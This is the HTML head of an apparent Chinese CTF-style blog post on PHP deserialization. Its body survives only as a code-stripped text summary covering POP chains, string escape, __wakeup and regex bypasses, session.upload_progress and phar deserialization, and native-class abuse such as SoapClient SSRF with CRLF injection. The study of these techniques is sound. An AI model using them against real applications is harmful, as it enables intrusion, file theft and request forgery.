<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>php反序列化 | VV</title><meta name="keywords" content="web,后端漏洞"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="php反序列化"><meta name="application-name" content="php反序列化"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="php反序列化"><meta property="og:url" content="http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="PHP反序列化面向对象面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了 面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中按顺序调用函数 面向对象就是把现实中的"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="PHP反序列化面向对象面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了 面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中按顺序调用函数 面向对象就是把现实中的"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: 'php反序列化',
  postAI: '',
  pageFillDescription: 'PHP反序列化, 面向对象, 面向过程, 面向对象, 类, 定义, 继承, 类的结构, 类的修饰符, 序列化基础知识, r与R, 对象的序列化, 反序列化, 反序列化漏洞, 魔术方法, 定义, 介绍, __construct(), __destruct(), __sleep(), __wakeup(), __toString(), __invoke(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __clone(), 总结, POP链, 前置, pop链构造与poc编写, 字符串逃逸, 减少逃逸, 增多逃逸, __wakeup绕过, 引用, session反序列化, 使用, php session理解, 定义, 处理器与利用, 利用函数, php处理器, php处理器, php_binary处理器, php_serialize 处理器, 利用方式, 自建环境模拟, 利用session.upload_progress进行反序列化-方式一, 利用session.upload_progress进行反序列化-方式二, phar反序列化, phar反序列化基础, 脏数据污染, zip添加脏数据, tar添加脏数据, pahr文件, GC强制回收, bypass绕过, __wakeup绕过, __destruct绕过, 正则绕过, 引用绕过, 16进制绕过字符的过滤, phar的绕过, 原生类, 介绍, 常用原生类使用, DirectoryIterator(), FilesystemIterator, GlobIterator, 绕过open_basedir, SplFileObject(), ZipArchive(), ReflectionMethod, Error, Exception, 绕hash, SimpleXMLElement, SoapClient反序列化面向对象面向过程就是分析出解决问题所需要的步骤然后用函数把这些步骤一步一步实现使用的时候一个一个依次调用就可以了面向过程是一种以整体事件为中心的编程思想编程的时候把解决问题的步骤分析出来然后用函数把这些步骤实现在一步一步的具体步骤中按顺序调用函数面向对象就是把现实中的事物都抽象为对象每个对象是唯一的且都可以拥有它的属性与行为我们就可以通过调用这些对象的方法属性去解决问题面向对象是一种以对象为中心的编程思想把要解决的问题分解成各个对象对象是一个由信息及对信息进行处理的描述所组成整体是对现实世界的抽象类定义类是对一组有相同数据和相同操作的对象的定义是对象的模板其包含的方法和数据描述一组对象的共同行为和属性类是在对象之上的抽象对象则是类的具体化是类的实例类可有其子类也可有其他类形成类层次结构类是定义了一件事物的抽象特点它将数据的形式以这些数据上的操作封装在一起对象是具有类类型的变量是对类的实例内部构成成员变量属性成员函数方法属性定义在类内部的变量该变量的值对外是不可见的但是可以通过方法访问在类被实例化后该变量即可成为对象的属性方法定义在类的内部可用于访问对象的数据继承让某个类型的对象获得另一个类型的对象的属性和方法继承就是子类继承父类的特征和行为使得子类对象实例具有父类的实例域和方法或子类从父类继承方法使得子类具有父类相同的行为父类一个类被其他类继承可将该类称为父类基类超类子类一个类继承其他类则该类被称为子类派生类类的结构定义类类名声明成员变量属性声明成员函数方法调用这个类中的属性时使用方法传参可直接调用实例化对象把他赋值为对象程咬金赋值参数男跳跳跳调用方法打印类的修饰符对外公开访问级别最高只对同一个包中的类或者子类公开默认只对同一个包中的类公开不对外公开只能在对象内部访问访问级别最低可以不行不行子类可以不能触发方法也可以用修饰符序列化基础知识序列化串行化是将变量转换为可保存或传输的字符串的过程类型例子序列化结果空字符整型浮点型布朗型字符串长度数组参数数量编号与当两个对象本来就是同一个对象时后出现的对象将会以小写表示不过基础类型不受此条件限制总是会被序列化基础类型二者都是而当中的一个对象如果是对另一对象显式的引用那么在同时对它们进行序列化时将通过大写表示分析对于同一个对象直接对取出的对象引用进行了一次解引用便将这个对象赋给了右值待会说先看下面几行而对于对象引用其反序列化过程与上面小非常像不一样的地方在于和之间并没有对取出的引用进行解引用直接将这个引用赋给了右值如果取出的引用本身指向的是一个引用还会进一步跟到引用指向的对象创建一个新的指向对应对象的引用赋给右值略后的数字那么后面跟的数字是怎么决定的呢首先我们先来黑箱分析一下注意这变了压缩了一下同上相信大家定睛看两眼上面的例子就能猜出后面的数字指代的是在同一反序列化过程中出现过的第个非键对象我又在瞎起名字了看过上面的源码以后很容易猜到在反序列化过程中这一步正是上面取值的关键在反序列化过程中我们看到函数在一开头就进行了这样的操作当然前提是反序列化的对象的标记不能是因为引用本身如果也计算在内那么就有可能出现循环引用浙恒河里而正是向列表一个新的元素其实并不单单是一个列表只是本文为方便这么说罢了这时候就有同学要问了数组的是数字对象的属性名是字符串它们都存在于反序列化过程当中为什么它们没有被进呢我们回头看一下的条件后面那个已经在恒河里了那么前面那个非的判断意义何在呢桥豆麻袋是哪里来的呢的参数里有个宏自然而然地我们回去看这个是怎么调用的看看什么情况下传入的为高度简化版略可以看到当反序列化数组对象这种东西的时候只有反序列化值时会传入这个列表键并不存在于这个对象中的列表中真相大白注对象的序列化类名长类名属性数属性名长属性名值长值当属性类型为时会将属性名变为空类名属性名空编码后所以前面是同理空空套娃把一个序列化的对象赋值给了反序列化反序列化是将字符串转换成变量或对象的过程反序列化之后的内容为一个对象反序列化生成的对象里的值由反序列化里的值提供与原有类预定义的值无关反序列化不触发类的方法除非是魔术方法或调用方法反序列化漏洞成因反序列化过程中的值可控通过更改这个值得到所需要的代码魔术方法定义一个预定义好的在特定情况下自动触发的行为方法魔术方法在特定条件下自动调用相关方法介绍构造函数在实例化一个对象的时候首先会去自动执行的一个方法析构函数在对象所有的引用被删除或者当对象被显式销毁时执行的魔术方法在序列化过程中不会触发在反序列化过程中会触发实例化对象结束后也会触发序列化函数会检查类中是否存在一个魔术方法若存在则该方法会先被调用再执行序列化返回需要被序列化存储的成员属性删除不必要的属性与相反反序列化会检查是否存在一个方法若存在则会先调用该方法预先准备对象需要的资源把对象当作字符串调用时触发把对象当作函数调用时触发调用一个不存在的方法时触发两个参数返回值调用的不存在的方法名和参数静态调用或者调用成员常量时使用的方法不存在此时触发两个参数返回值调用的不存在的方法和名称的参数调用的成员属性不存在时触发一个参数返回值不存在的属性名给不存在的属性赋值时触发两个参数返回值不存在的属性名和赋的值对不可访问属性使用或时触发一个参数返回值不存在不可访问的属性名对不可访问属性使用时触发一个参数返回值不可访问的成员属性名当使用关键字拷贝完成一个对象后新对象会自动调用定义的魔术方法总结链前置例题思路这里的不会被调用因为没有序列化法法删去没用的类外赋值魔术方法触发前提魔术方法所在类或对象被调用链构造与编写链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种概念验证在安全界可以理解成漏洞验证程序是一段不完整的程序仅仅是为了证明提出者的观点的一段代码字符串逃逸反序列化分隔符反序列化以结束后面的字符不影响正常的反序列化属性逃逸一般的数据先经过一次再经过在这个中间反序列化的字符串变多或者变少的时候很有可能存在反序列化属性逃逸减少逃逸例题增多逃逸例题绕过条件序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过的执行例可以绕过正则表达式当正则过滤后数字时可以用引用绕过但是中要有帕鲁杯也可以想其他办法将后的数字改了引用例构造使的值随变化而变化再取的值就一样了反序列化使用当被调用或者中的为时内部调用会话管理器访问用户被序列化以后存储到指定目录默认为赋值键名竖线经过函数处理过的值例补理解定义一般称为会话控制简单来说就是一种客户与网站服务器更为安全的对话方式一旦开启了会话便可以在网站的任何页面使用或保持这个会话从而让访问者与网站之间建立了一种对话机制不同语言的会话机制可能有所不同可以看做是一个特殊的变量且该变量是用于存储关于用户会话的信息或者更该用户会话的设置需要注意的是变量存储单一用户的信息并且对于应用程序中的所有页面都是可用的且其对应的具体值会存储于服务器端这也是与的主要区别所以的安全性相对较高工作流程会话工作流程很简单当开始一个会话时会尝试从请求中查找会话通常通过会话如果发现请求的中不存在就会自动调用函数创建一个新的会话并且在中通过头部发送给客户端保存有时候浏览器用户设置会禁止当在客户端被禁用的情况下也可以自动将添加到参数中以及的字段中但这需要将中的设为开启也可以在运行时调用来设置这个配置项会话开始后就会将会话中的数据设置到变量中如下述代码就是一个在变量中注册变量的例子当停止的时候它会自动读取中的内容并将其进行序列化然后发送给会话保存管理器来进行保存默认情况下使用内置的文件会话保存管理器来完成的保存也可以通过配置项来修改所要采用的会话保存管理器对于文件会话保存管理器会将会话数据保存到配置项所指定的位置可参考下图在中的配置在中主要存在以下配置项该配置主要设定用户自定义存储函数如果想使用内置存储机制之外的可以使用这个函数这里表明是以文件的方式来进行存储的该配置主要设定用户自定义存储函数这里表明的默认序列话引擎使用的是处理器引擎该配置主要设置的存储路径这里表明所有的文件都是存储在下表明默认不启动该配置主要设定用户自定义存储函数如果想使用内置存储机制之外的可以使用这个函数定义用来序列化反序列化的处理器名字默认使用还有其他引擎且不同引擎的对应的的存储方式不相同具体可见下文所述参考下面主要谈谈配置项处理器与利用上文中提到的的序列化机制是由来定义引擎的引擎也就是处理器而序列化后的字符串默认是以文件的方式存储且存储的文件是由来决定文件名的如下当然这个文件名也不是不变的如框架的存储的文件名为等并且文件的内容始终是值的序列化之后的内容利用函数提供了配置的选项可以用来定义要使用的处理器默认是如果想要使用其他的就需要使用函数格式如下要想使用第一步就是开启这也是的第一阶段这是就需要使用函数这个函数的作用就是开启开启之后读取信息判断是否存在如果存在就是用这个如果没有就会随机生成一个唯一的位的通过这个就可以绑定一个唯一的用户这个过程还会初始化这个变量但是有两种情况若没有这个文件就会读取信息的内容从而序列化数据创建变量并创建一个文件若存在文件读取文件中的内容把内容反序列化之后赋值到这个变量中这个阶段还有一个特别关键的作用还会判断那些文件已经过期调用进程删除掉过期的文件参考以及处理器定义的引擎有三种如下表所示处理器名称存储格式键名竖线经过函数序列化处理的值键名的长度对应的字符如键长为则对应键名经过函数序列化处理的值经过函数序列化处理的数组注从起可以使用上述三种处理器中在内部简单地直接使用函数并且不会有和所具有的限制使用较旧的序列化处理器导致的索引既不能是数字也不能包含特殊字符和测试一下如下处理器解析一下序列化的结果为其中为的键名为传入参数经过序列化后的值处理器将指定处理器函数的参数改为这个就行为了方便看将键名改长一些否则对应的字符不可见测试结果如下改为结果如下两张图片可以对比一下序列化的结果为解析一下即为长度为在对应的符号是键名注意这里序列化后的结果会在原代码设置的键名后加一个测试了一下无论大写为多少即为序列化后的字符串处理器如下测试结果序列化结果为解析表示数组中有一个元素或括号里面的内容即为传入参数经过序列化后的值利用方式自建环境模拟建造一个环境有两个文件分别如下这个页面用于接受的值这个页面用于测试反序先访问输出这里开启了函数可以在页面利用变量进行反序列化如下构造再在页面传入这个参但是需要在前面加上一个这是因为处理器会把前面的内容当做键后面的内容才会被反序列化后赋值给变量此时的这里可以看到成功写入这是再访问以下成功反序列化但是这里的局限性太大有如下条件两个文件引擎配置不同其中一个可控两个文件同域这个只是一个简单的复现过程真实题目应该不能自己传进去现在看看稍真实页面是如何打的利用进行反序列化方式一结合下述上传进度这个方法需要漏洞官方说明这个漏洞条件官方说的挺清楚的简单说明一下使用这个方法的条件条件是否启用上传进度报告是否上传完成之后删除文件这里需要为这两个都是可在查的当被设置为时此时再往服务器中上传一个文件时会把该文件的详细信息如上传时间上传进度等存储到所以上传文件进度的报告就会以写入到文件中所以我们可以设置一个与同名的变量默认名为检测到这种同名请求会在中添加一条数据我们就可以控制这个数据内容为我们的恶意对上传进度说明一下但是需要自己构造一个文件上传表单代码如下在上传文件必须上传时抓包直接借用官方的说明有两种改法第二种待验证来进行反序第一个就是上述官方改法还有一个是在文章里看到可以改将那个改成文章基本都是这样改的在值里面改肯能会应该出现导致数据写入失败但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突需要使用来说明借用文章代码说明一下待验证还是很多文章都在用这种改法上传成功就可以直接在页面利用这个利用进行反序列化方式二同样需要这个方法着重于解决当配置如下使如何解决一般这个是的默认项这里与上面的最主要的区别就是表示当文件上传结束后将会立即清空对应文件中的内容也就代表我们每次正常访问文件时都是空文件所以想要利用就需要竞争如果被设置为就需要使用条件竞争还有一个比较重要的配置这个选项默认值为表示我们对中的可控这一点很重要开始解析配置文件中的默认为时这个情况下用户可以定义自己的例如当用户在中设置时就会生成一个文件此时也就初始化了并且会将上传的文件信息写入到文件中去由于在这种情况下的值为所以文件上传成功后文件内容会马上被清空此时就需要利用的多线程来条件竞争参考文章其他例题参考简单过程说明以及其他题解文章反序列化反序列化基础是一种文件与反序列化关系结构原理例改类名命令条件例生成文件版本问题把中的参数改了不挑后缀脏数据污染支持的格式文件可以是下面三种格式在实战中的利用可以使用压缩包的方法直接将数据压缩为从而绕过或反序列化字段的检测不会压缩反序列化数据段可以使用格式修复的方法解决文件头部使用或者文件尾使用被添加脏数据的问题添加脏数据头尾均可添加脏数据但是无法解析此外在手册中还提到可以在中通过以下方式添加脏数据在中的使用限制格式的文件头尾都可以有脏字符通过对偏移量的修复就可以重新获得一个合法的文件但是否遵守这个规则仍然取决于解析器经过测试解析器如果发现文件头不是格式即使后面偏移量修复完成也将触发错误虽然添加不了脏数据让人大失所望但是却在这里看到了却只要将的内容写进压缩包注释中也同样能够反序列化而且压缩后的数据也可以绕过检测但是过不了反序列化数据检测和执行生成格式差不多但是挺有意思的记一下吧哪些场景不能解析带脏字符的文件呢执行这个带脏字符的包时会失败无法解析无法解析添加脏数据可以在文件尾添加脏数据且正常解析对于格式如果能控制文件头即可构造合法的文件即使文件尾有垃圾字符这个测试的话毫无技术要求直接使用打开文件然后触发调用可以看到反序列化还是被正常执行了后缀名必须为设置自定义的存入添加要压缩的文件签名自动计算未修改读取数据失败反序列化触发成功文件头添加内容读取数据失败反序列化触发失败文件尾添加内容读取数据失败反序列化触发成功这段代码主要展示了如何使用归档文件以及如何通过文件来触发对象的反序列化是一种的归档格式允许开发者将多个文件打包成一个文件并可以直接通过解释器执行然而代码中有一些注释掉的部分这些部分原本是用来创建文件的代码的目的似乎是为了测试不同情况下通过文件读取数据时是否能够成功触发对象的反序列化此外还在使用绕过签名看到可以直接使用打包一个只放了反序列化数据的文件生成的压缩包可以直接用来触发反序列化环境下执行生成的可以直接通过触发反序列化文件可以在文件头添加脏数据且正常解析格式必须控制文件尾但不需要控制文件头在解析时会在文件内查找这个标签这个标签前面的内容可以为任意值但后面的内容必须是格式并以该文件的签名与字符串结尾格式可以直接在文件头加脏数据并且还能正常反序列化但是这点需要重新计算一下签名下面就是修正签名的脚本默认使用加密就是有字节的签名生成结果在签名后面还有字节前字节表示文件使用的签名算法最后四字节固定用于表示该文件存在签名文件内容数据段签名默认有字节大小签名方式字节声明文件有无签名字节除了之外还可以使用生成签名签名是前面全部数据段的内容根据加密算法加密得到的结果所以当我们想要利用触发反序列化但是上传的文件在头部被添加了脏数据的话我们可以通过以下方法构造可利用的文件先生成正常的的文件往文件头部添加脏数据使用上面代码改正签名使用将头部的脏数据删除上传文件强制回收执行条件对象为生命周期结束的时候当一个对象被由此如果程序走了一半突然报错那么不会触发了那如果又必须要触发又该如何操作呢简称又名垃圾回收在中使用引用计数和回收周期来自动管理内存对象的垃圾顾名思义就是一些没有用的东西在这里指的是一些数据或者说是变量在进行某些操作后被置为空或者是没有地址指针的指向这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号那么就不会出现无法调用方法了具体原理可查看官方解答回收周期接下来用演示代码演示的实际工作原理此时结果如图了一个对象屁股还没坐热就了后面的两个对象则是按部就班先创建完没有操作了以后才结束的区别就在于对象没有任何引用也没有指向在创建的那一刻就被当作垃圾回收了从而触发了方法进而如果没有指向可以那如过在指向一个对象的中途忽然指向另一个也就是舍弃了该对象又会怎么样仍然触发了但若注销了呢如图正常创建最后销毁当一个对象没有任何引用的时候则会被视为垃圾即对象被变量引用所以该对象不是垃圾而如果是这样或这样这样在在没有被引用或在失去引用时便会被当作垃圾进行回收触发这就是回收的大致理解所以例就这明显首端尾巴但是如果没有这句就真的构造完了但是有的话是不会执行的而不执行这条链子根本就是堵死的没啥用根据之前说的回收机制可以把一段数据当做垃圾回收那不就可以执行然后就有一个问题如何触发回收机制还记得之前举过的例子吗如过没有如何东西指向一个对象那个对象就会被当作垃圾回收所以我们先看修改后的明显就加了一行代码然后再改一下如下也可以把目标对象赋给键为键为赋值为为什么要这么做因为这样操作后得到的字符串为这是结果但是只有还是不行还要再改一下将改成就可以了原理是一样的第一个为数组为数组中键有两个以及重点重点重点虽然有两个键对应的是我们目标对象是如果这个时候我们做一件坏事把本应该等于修改为那不就是把指向了吗然后就实现了回收所以最后我们修改后的字符串为成功回收机制的利用需要修改字符串中的数据如果反序列化的话就还需要额外修改文件的签名如果遇到的话就需要在修改序列化字符串后再对其进行加密得到的数据替换原本的签名绕过绕过见上文绕过见上文强制回收快速触发修改序列化数字元素个数改成去掉序列化尾部改成详见正则绕过如匹配序列化字符串是否是对象字符串开头利用加号绕过注意在里传参时要编码为利用数组对象绕过如为要反序列化的对象序列化结果开头是不影响作为数组元素的的析构号绕过将对象放入数组绕过引用绕过见上文进制绕过字符的过滤序列字符串中表示字符类型的大写时会被当成进制解析未作处理前会被拦截将小改为大做处理后是的进制成功绕过的绕过当环境限制了不能出现在前面的字符里可以使用和等绕过也可以利用其他协议格式验证可以通过在文件头部添加绕过设置生成一个修改后缀名为过滤了将文件进行压缩使用压缩后文件同样也能反序列化常用将的内容写进压缩包注释中也同样能够反序列化成功压缩为也会绕过原生类介绍原生类指的是内置的类它们可以直接在代码中使用且无需安装或导入任何库相当于代码中的内置方法例如等等可以直接调用但是原生类就是可以就直接中直接创建的类我们可以直接调用创建对象但是这些类中有的会有魔术方法为此我们可以创建原生类去利用其中的魔术方法来达到我们反序列化的利用通过代码直接获取原生类和相关魔术方法可以根据题目环境将指定的方法添加进来来遍历存在指定方法的原生类结果截不完不同版本的其中包含的原生类不同为了使用到较全的原生类建议将的版本调到以上常用原生类使用使用类可以遍历目录下的文件名不加也可以因为可以自动调用传入就会查看到当前目录下的文件同理使用可以查看上级目录下的文件使用绝对路径亦可以查看服务器指定目录下的文件目录是遍历目录关键没有就只遍历第一个字符回显的也可以使用和协议读取文件内容是继承于的类两者作用和用法基本相同区别为会显示文件的完整路径而只显示文件名是不是第一个是继承的的魔术方法而第二个是的为了达成上一个的效果的魔术方法也可以使用协议在以后使用了来禁止一些类的反序列化很不幸的是这两个原生类都在禁止名单当中与之前两个类的作用和使用方法类似不同点在于其行为类似于可以通过模式匹配来寻找文件路径前两个需要利用协议才可以模式匹配绕过限制目录将所能打开的文件限制在指定目录树包括文件本身使用和的协议可以无视对目录的限制可以用来列举出指定目录下的文件使用也是一样的指定目录利用进行文件内容的读取文件要到源码中查看同理没有则只回显一行绝对路径也可也可利用进行文件删除文件已删除删除了文件总是以一个新的压缩包开始在此模式下如果已经存在则会被覆盖这是一个常数项值为利用获取注释的内容获取注释内容由该原生类中的方法可以访问到注释的内容注释文本需符合开头的规范否则无法识别在类中方法前的注释是所有内部错误类的基类在开启报错的情况下的字符串表达类属性错误消息内容错误代码抛出错误的文件名抛出错误的行数内置有一个的方法可以产生漏洞将第二个输出结果赋值给第一个代码的返回的表达形式与同理是所有用户级异常的基类将异常对象转换为字符串类属性错误消息内容错误代码抛出错误的文件名抛出错误的行数同样也有漏洞同样将赋值给返回转换为字符串类型的异常绕利用和先看一下输出两个编译器编译后对比发现这两个原生类返回的信息除了行号一模一样利用这点我们可以尝试进行函数的绕过需要注意的是必须将两个传入的对象放到同一行因此我们可以进行简单的测试发现使用此方法可以绕过强弱函数比较不等于值相等值相等没有问题例极客大挑战需要绕过两个强比较且最终需要构造代码执行显然正常方法是行不通的而通过原生类可进行绕过同样当和函数处理对象时会自动调用方法两次取反绕过正则可解析文档中的元素利用实例化该类的对象来传入代码进行攻击进而读取文件内容和命令执行创建一个新的对象参数根据官方文档发现当第三个参数为时即可实现远程文件载入第二个参数的常量值设置为即可也是一个常数参考赛题是一个专门用来访问服务的类可以提供一个基于协议访问服务的客户端可以创建数据报文与接口进行交互是基于的简易协议是用在分散或分布的环境中交换信息的简单的协议可使应用程序在之上进行信息交换是三要素之一用来描述如何访问具体的接口用来管理分发查询简单对象访问协议是连接或服务或客户端和服务之间的接口其采用作为底层通讯协议作为数据传送的格式扩展模块默认关闭使用时需手动开启配置文件里面开启选项调用函数通常函数可以作为对象的方法调用由此可利用这个类进行构造函数第一个参数是用来指明是否是模式如果为那就是非模式第二个参数为一个数组如果在模式下此参数可选如果在非模式下则必须设置和选项其中是要将请求发送到的服务器的而是服务的目标命名空间由此随便调用对象中不存在的方法触发方法进行监听可以看到和都可控本地测试时发现当使用此内置类即协议请求存在服务的端口时会立即报错而去访问不存在服务未占用的端口时会等待一段时间报错可以以此进行内网资产的探测同时还可以配合漏洞可以通过来控制其他参数或者发送数据例如协议去攻击报文的结构状态行和首部中的每行以结束首部与主体之间由一空行分隔注入漏洞是因为应用没有对用户输入做严格验证导致攻击者可以输入一些恶意字符攻击者一旦向请求行或首部中的字段注入恶意的就能注入一些首部字段或报文主体并在响应中输出通过结合我们利用便可以干更多的事情例如插入自定义发送的数据包这里需要将设置为我们可以通过添加两个来将原来的挤下去自定义一个新的参考赛题上的题获取头',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-13 13:11:45',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" 